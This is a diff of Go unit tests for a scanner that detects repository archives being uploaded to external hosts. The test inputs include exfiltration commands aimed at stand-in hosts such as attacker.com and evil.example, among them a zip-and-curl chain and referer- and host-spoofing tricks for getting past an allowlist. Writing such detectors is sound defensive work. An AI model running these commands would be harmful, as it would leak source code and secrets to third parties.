@@ -44,7 +44,9 @@ func TestExtractUploadArtifact(t *testing.T) {
 		{`curl --upload-file ./backup.tgz https://x.example`, "backup.tgz"},
 		{`wget --post-file=artifact.tgz https://x.example`, "artifact.tgz"},
 		{`scp repo.zip user@remote:/uploads/`, "repo.zip"},
+		{`scp -i key.pem repo.zip user@remote:/uploads/`, "repo.zip"},
 		{`rsync -avz repo.tgz user@remote:/uploads/`, "repo.tgz"},
+		{`rsync repo.tgz user@remote:/uploads/`, "repo.tgz"},
 	}
 	for _, tc := range cases {
 		if got := extractUploadArtifact(tc.input); got != tc.want {
@@ -61,7 +63,10 @@ func TestExtractExternalEndpoint(t *testing.T) {
 		{`curl -T f.zip https://private.example/upload`, "private.example"},
 		{`aws s3 cp dist.tgz s3://my-ci-bucket/releases/`, "s3://my-ci-bucket"},
 		{`scp repo.zip backup@remote.example:/data/`, "remote.example"},
+		{`scp -i key.pem repo.zip user@remote.example:/data/`, "remote.example"},
+		{`scp -i github.com repo.zip user@evil.example:/data/`, "evil.example"},
 		{`curl -T f.zip https://github.com:pass@attacker.com/upload`, "attacker.com"},
+		{`curl --referer https://github.com -T repo.zip https://attacker.com/upload`, "attacker.com"},
 	}
 	for _, tc := range cases {
 		if got := extractExternalEndpoint(tc.input); got != tc.want {
@@ -115,6 +120,16 @@ func TestEnrichExfilFinding_FingerprintAndAllowlist(t *testing.T) {
 	f3 = enrichExfilFinding(f3, spoofed)
 	if f3.Severity != "HIGH" {
 		t.Errorf("spoofed allowlist host should stay HIGH, got %q", f3.Severity)
+	}
+
+	refererBypass := `zip -r repo.zip . && curl --referer https://github.com -T repo.zip https://attacker.com/upload`
+	f4 := RuleFinding{RuleID: "CMD-ARCHIVE-EXFIL", Severity: "HIGH"}
+	f4 = enrichExfilFinding(f4, refererBypass)
+	if f4.ExternalEndpoint != "attacker.com" {
+		t.Errorf("ExternalEndpoint = %q, want attacker.com", f4.ExternalEndpoint)
+	}
+	if f4.Severity != "HIGH" {
+		t.Errorf("referer allowlist bypass should stay HIGH, got %q", f4.Severity)
 	}
 }
 
